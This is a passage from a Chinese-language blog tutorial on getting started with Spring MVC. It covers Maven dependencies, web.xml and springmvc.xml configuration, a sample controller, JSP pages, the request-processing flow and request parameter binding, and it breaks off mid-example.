class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>spring_mvc_01_basic<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span><span class="comment">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-clean-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-war-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-install-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-deploy-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>在javaweb中，前端发出的请求，都会被映射到 Web.xml 中，然后匹配到对应的 Servlet 中，然后调用对应的 Servlet 类 来处理这个请求</p><h3 id="配置核心控制器"><a href="#配置核心控制器" class="headerlink" title="配置核心控制器"></a>配置核心控制器</h3><p>由于现在使用springmvc，就都交给springmvc进行管理，在webapp-web-info中找到web.xml，进行配置核心控制器，<code>DispatcherServelt</code></p><p><code>&lt;servlet &gt;&lt;/servlet &gt;</code>标签中指定了一个实现类为 DispatcherServelt ，名称为 dispatcherServlet 的 servlet 配置</p><p><code>&lt;servlet-mapping&gt;&lt;/servlet-mapping&gt;</code>标签中则指定了 dispatcherServlet 拦截请求的范围，使用 <code>/</code> 即代表所有请求都需要经过这里</p><p><code>&lt;init-param&gt;&lt;/init-param&gt;</code>标签对中放置 DispatcherServelt 所需要的初始化参数，配置的是 contextConfigLocation 上下文参数变量，其加载的配置文件为编译目录下的 springmvc.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置Servlet初始化参数，读取springmvc的配置文件，创建spring容器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置servlet启动时加载对象--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="创建核心配置文件"><a href="#创建核心配置文件" class="headerlink" title="创建核心配置文件"></a>创建核心配置文件</h3><p>开启扫描，以及开启注解，还有就是配置视图解析器，它的作用就是执行方法后，根据返回的信息，来加载相应的界面，并且绑定反馈数据。刚开始访问controller的时候一直是500，后来知道这个xml在resource下（应该是位置的问题），springmvc.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc/spring-mvc.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置spring创建容器时要扫描的包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.yutao&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置视图解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;viewResolver&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/pages/&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置spring开启注解mvc的支持 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里还有可能爆404的错，就是进不去controller，如果配置都写对的话，那就是没有导入依赖到web-info下的lib中，下图是导入后的，导入的话点put into output root就行。</p><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220401161338812.png" alt="image-20220401161338812"></p><h3 id="写控制类-ControllerDemo"><a href="#写控制类-ControllerDemo" class="headerlink" title="写控制类 ControllerDemo"></a>写控制类 ControllerDemo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ControllerDemo</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/test&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">methodTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是Controller测试方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编写页面"><a href="#编写页面" class="headerlink" title="编写页面"></a>编写页面</h3><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h3&gt;这是主页面&lt;/h3&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;test&quot;</span>&gt;访问test试试&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>WEB-INFO-&gt;pages：testSuccess.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h3&gt;跳转成功&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后就是配置tomcat.</p><h1 id="MVC请求流程"><a href="#MVC请求流程" class="headerlink" title="MVC请求流程"></a>MVC请求流程</h1><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220331230653972.png" alt="image-20220331230653972"></p><p><strong>前端控制器（DispatcherServlet）</strong></p><ul><li>  接收用户请求，以及做出响应</li><li>  它负责调用其他组件处理用户的请求，控制整个流程的执行，想当于一个中央处理器</li><li>  它降低了组件之间的耦合行，利于组件之间的扩展</li></ul><p><strong>处理器映射器（HandlerMapping）</strong></p><ul><li>  根据用户请求的 URL 路径，通过注解或者 XML 配置，寻找匹配的 Handler 即处理器</li></ul><p><strong>处理器适配器（HandlerAdapter）</strong></p><ul><li>  根据映射器找到的处理器（Handler）信息，按照特定规则执行相关的 Handler （常称为 Controller）</li></ul><p><strong>处理器（Hander）</strong></p><ul><li>  这就是开发中要编写的具体业务逻辑控制器，执行相关的请求处理逻辑，并且返回相应的数据和视图信息，然后封装到 ModeAndView 对象中</li></ul><p><strong>视图解析器（View resolver）</strong></p><ul><li>  通过ModelAndView 对象中的 View 信息将逻辑视图名解析成物理视图名，即具体的页面地址，然后再生成 View 视图对象，最后对 View 进行渲染处理结果通过页面展示给用户</li></ul><p><strong>视图（View）</strong></p><ul><li>  本身是一个接口，实现类支持不同 View 类型 (JSP、FreeMarker、Excel 等)</li></ul><p>注：我们开发人员真正需要进行开发的是处理器（Handler）和视图（View）</p><p>也就是，处理用户请求的具体逻辑代码，以及展示给用户的界面</p><h1 id="请求映射与参数绑定"><a href="#请求映射与参数绑定" class="headerlink" title="请求映射与参数绑定"></a>请求映射与参数绑定</h1><h2 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="RequestMapping"></a>RequestMapping</h2><p><code>@RequestMaspping</code> 注解是指定控制器可以处理哪些URL请求，这个注解可以放在类或者方法上。</p><ul><li>  类上：一级访问目录</li><li>  方法上：二级访问目录</li></ul><p>参数：</p><ul><li>  path：指定请求路径的url</li><li>  value：value属性和path属性是一样的</li><li>  mthod：指定该方法的请求方式</li><li>  params：指定限制请求参数的条件</li><li>  headers：发送的请求中必须包含的请求头</li></ul><p>eg:<code>@RequestMaspping(/test)</code></p><h2 id="请求参数绑定"><a href="#请求参数绑定" class="headerlink" title="请求参数绑定"></a>请求参数绑定</h2><p>用户页面的请求一般都是键值对，传统javaweb使用<code>request.getParameter()</code>方法获取请求参数</p><p>而springMVC可以通过参数绑定，将客户端的k/v格式的数据绑定到controller处理器方法的形参上，支持的数据类型分为三类：</p><h3 id="基本类型和字符串类型"><a href="#基本类型和字符串类型" class="headerlink" title="基本类型和字符串类型"></a>基本类型和字符串类型</h3><p>以下均为部分：</p><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;user/testA?username=admin&amp;password=admin888&quot;</span>&gt;测试一下&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>testsuccess.jsp不变</p><p>userController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/testA&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testA</span><span class="params">(String username, String password)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;获取到的username: &quot;</span> + username);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取到的password: &quot;</span> + password);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">        <span class="comment">//构造url：user/testA?username=admin&amp;password=admin888</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220331232035058.png" alt="image-20220331232035058"></p><h3 id="JavaBean实体类型"><a href="#JavaBean实体类型" class="headerlink" title="JavaBean实体类型"></a>JavaBean实体类型</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><blockquote><p>  JavaBeans是Java中一种特殊的类，可以将多个对象封装到一个对象（bean）中。特点是<strong>可序列化</strong>，<strong>提供无参构造器</strong>，<strong>提供getter方法和setter方法访问对象的属性</strong>。名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。 –from 维基百科</p></blockquote><p>Javabean相比其他java类的特征：</p><ul><li>  提供一个默认的无参构造函数。</li><li>  需要被序列化并且实现了 Serializable 接口。</li><li>  可能有一系列可读写属性。</li><li>  可能有一系列的 getter 或 <strong>setter</strong> 方法。</li></ul><h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>1.jsp:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: <span class="number">86177</span></span><br><span class="line">  Date: <span class="number">2022</span>/<span class="number">3</span>/<span class="number">31</span></span><br><span class="line">  Time: <span class="number">23</span>:<span class="number">35</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;javabean&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;user/testB&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    昵称: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;nickname&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">    年龄: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;age&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>usercontroller:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testB&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testB</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;nickname: &quot;</span> + user.getNickname());</span><br><span class="line">        System.out.println(<span 